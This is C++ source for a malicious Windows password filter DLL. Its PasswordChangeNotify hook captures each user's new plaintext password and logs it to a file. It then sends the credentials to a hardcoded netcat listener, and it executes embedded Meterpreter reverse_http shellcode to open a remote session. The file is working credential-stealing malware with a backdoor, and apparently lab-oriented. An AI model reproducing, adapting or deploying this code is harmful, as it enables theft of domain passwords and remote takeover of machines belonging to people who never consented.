//PasswordFilter.dll: password filter function to export creds to netcat listener
#include "pch.h"
#include <stdio.h>
#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <NTSecAPI.h>
#include <fstream> //Not strictly needed, but needed for POC

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"


//We need to implement this, but it won't be used in malware
//Gets called when LSA loads the password filter
extern "C" __declspec(dllexport) BOOLEAN InitializeChangeNotify(void)
{
	return TRUE;
}

//Gets called when the user changes their password
//COULD write malware here to tamper with the password change process
extern "C" __declspec(dllexport) BOOLEAN PasswordFilter(
	PUNICODE_STRING AccountName,
	PUNICODE_STRING FullName,
	PUNICODE_STRING Password,
	BOOLEAN SetOperation)
{
	return TRUE;
}

//Gets called after PasswordFilter
//Kind of like a callback
extern "C" __declspec(dllexport) NTSTATUS PasswordChangeNotify(
	PUNICODE_STRING UserName,
	ULONG RelativeId,
	PUNICODE_STRING NewPassword)
{	
	char credentials[200];
	FILE* OUTFILE;

	//Print credentials to file
	sprintf_s(credentials, "%ws:%ws", UserName->Buffer, NewPassword->Buffer);
	fopen_s(&OUTFILE, "C:\\users\\user\\desktop\\creds.txt", "a+");
	if (NULL == OUTFILE)
	{
		return true;
	}
	fprintf_s(OUTFILE, "%s\n", credentials);
	fclose(OUTFILE);

    //Winsock data (https://docs.microsoft.com/en-us/windows/win32/winsock/complete-client-code)
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    const char* sendbuf = credentials;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("192.168.194.129", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    // Send an initial buffer
    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    printf("Bytes Sent: %ld\n", iResult);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // Receive until the peer closes the connection
    do {

        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0)
            printf("Bytes received: %d\n", iResult);
        else if (iResult == 0)
            printf("Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());

    } while (iResult > 0);

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    //spooky shellcode 
    //msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.194.130 LPORT=8080 -b "0x00" -f c
    unsigned char buf[] =
        "\x48\x31\xc9\x48\x81\xe9\xb4\xff\xff\xff\x48\x8d\x05\xef\xff"
        "\xff\xff\x48\xbb\x36\x86\x9f\xda\x3a\x97\x6c\x37\x48\x31\x58"
        "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xca\xce\x1c\x3e\xca\x7f"
        "\xa0\x37\x36\x86\xde\x8b\x7b\xc7\x3e\x7f\x07\x54\xce\x8c\x5f"
        "\xdf\xe7\x65\x56\xce\x14\x88\x22\xdf\xe7\x65\x16\xcb\xae\x13"
        "\x72\x1c\x1e\x67\x7e\x89\x28\x90\x70\xdf\x5d\xf7\x9a\xba\xfe"
        "\xa6\x38\xbb\x4c\x76\xf7\x4f\x92\x9b\x3b\x56\x8e\xda\x64\xc7"
        "\xce\x92\xb1\xc5\x4c\xbc\x74\xba\xd7\xdb\xea\xf1\xed\x4f\x2e"
        "\x8d\x9d\xd5\xbf\xe5\x6c\x37\x36\x0d\x1f\x52\x3a\x97\x6c\x7f"
        "\xb3\x46\xeb\xbd\x72\x96\xbc\xbc\x7e\x9e\xdb\x51\x7a\xb7\x3c"
        "\x7e\x37\x56\x7c\x8c\x77\xa6\xa5\x7f\xc9\x4f\xde\x51\x0e\x1f"
        "\x24\x36\xe0\xce\xae\x1a\x7b\x56\xa5\x3a\x9a\xc7\x9e\x1b\x02"
        "\x77\x19\xc6\x7a\x85\xd3\xfe\x32\xd2\x55\xe6\x43\x5e\xc7\x9e"
        "\xb1\xd7\x48\x7e\x37\x56\xf9\x9b\xb1\x9b\x24\x73\xbd\xc6\x83"
        "\x93\x3b\x47\x2d\xbc\x32\x0e\xd7\xdb\xea\xd6\x34\x76\x6e\xd8"
        "\xc6\x80\x7b\xcf\x2d\x6e\x77\xdc\xd7\x59\xd6\xb7\x2d\x65\xc9"
        "\x66\xc7\x9b\x63\xcd\x24\xbc\x24\x6f\xd4\x25\xc5\x68\x31\x7f"
        "\x07\x5d\xcc\x93\x84\xe0\x05\x59\x5f\xe8\xfa\xae\x3a\xd6\x3a"
        "\x7f\xbf\x67\xd6\x1d\xf8\xdb\x1b\x11\x31\x79\x4a\x89\x69\xdf"
        "\xe5\xd6\x65\xdc\xd2\xeb\xfa\xda\x5d\xfe\x65\xd5\xd6\x60\x00"
        "\xc1\x15\x90\x36\x86\x9f\xda\xc5\x42\x84\x27\x36\x86\x9f\xeb"
        "\x03\xa5\x42\x06\x00\xbe\xb1\xeb\x03\xa3\x42\x06\x05\xb6\x9f"
        "\x80\x72\x1e\xad\x7e\xf1\x46\x0f\xc5\x3a\x97\x21\x06\xff\xd5"
        "\xcc\xb0\x39\xc4\x25\x8d\x61\x0f\x00\x1c\x3a\x97\x6c\x37\xc9"
        "\x53\x77\x89\x3a\x97\x6c\x18\x51\xe5\xec\x92\x60\xd8\x35\x47"
        "\x7e\xbe\xda\x9d\x76\xf0\x0f\x44\x6c\xc3\xf9\xe3\x43\xc6\x06"
        "\x02\x70\xb5\xac\xec\x58\xd4\x35\x40\x59\xb4\xf0\xb0\x49\xf8"
        "\x07\x68\x5f\xe7\xae\xe9\x7e\xce\x5a\x40\x51\xf6\xe9\x8f\x5d"
        "\xfc\x27\x7c\x7e\xec\xf3\xac\x0c\xc3\x0d\x60\x02\xb3\xad\x8e"
        "\x5f\xc7\x3c\x4d\x70\xcc\xf5\xb0\x69\xdc\x0e\x67\x04\x86\xd7"
        "\x53\xfb\xc4\x36\x76\x6e\xcb\xae\x13\x69\xdf\xd4\x37\x34\xae"
        "\x1b\xda\x3a\x97\x6c\x67\x65\xd5\xd6\x1d\xf8\x7c\x39\x19\x0d"
        "\x79\x4a\x92\xb3\x51\x06\x3d\x69\xd5\xc5\x92\xb3\x66\x21\x06"
        "\xff\xcb\xae\x13\x69\xc4\x25\xf0\xf4\xab\x99\xc2\x41\x68\xb9"
        "\xb2\xf6\xf3\x80\x92\xfd\x56\xe4\x24\x36\x86\xd6\x60\x7e\x67"
        "\x59\xd7\x36\x86\x9f\xda\xc5\x42\x24\xc8\xf9\xf2\x9d\x31\xf6"
        "\x7f\x39\x37\x36\x86\xcc\x83\x50\xd7\x36\x7e\xbf\x57\x5e\x38"
        "\x2a\xde\xab\xf7\x36\x96\x9f\xda\x73\x2d\x34\x93\x65\x63\x9f"
        "\xda\x3a\x97\x93\xe2\x7e\x15\xcc\x89\x72\x1e\x8b\x7f\xbf\x77"
        "\xd7\x53\xe0\xde\xab\xf7\x36\xa6\x9f\xda\x73\x1e\x95\x7e\x8c"
        "\x94\x09\x53\xd8\x97\x6c\x37\x36\x79\x4a\x92\xb9\x53\x4c\xb2"
        "\xf6\xf2\x2d\xbc\xb1\x90\x24\x36\xf5\x03\x5f\xaf\xe8\xcf\xaf"
        "\x6f\x5c\x86\xc6\x93\xfd\x55\x9c\x82\x94\xd0\x60\x0f\x3a\x97"
        "\x6c\x37";

    //execute shellcode
    //https://security.stackexchange.com/questions/238336/cant-inject-meterpreter-shellcode-in-c-code
    void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof buf);
    ((void(*)())exec)();

	return true;
}